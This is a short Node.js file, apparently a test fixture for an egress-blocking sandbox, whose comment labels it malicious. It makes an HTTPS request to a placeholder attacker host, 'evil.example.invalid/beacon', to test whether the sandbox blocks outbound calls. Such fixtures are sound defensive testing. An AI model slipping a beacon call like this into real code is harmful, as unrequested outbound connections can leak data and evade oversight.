'use strict';
// Malicious fixture: attempt egress via https.request
const https = require('node:https');
https.request('https://evil.example.invalid/beacon', () => {}).end();
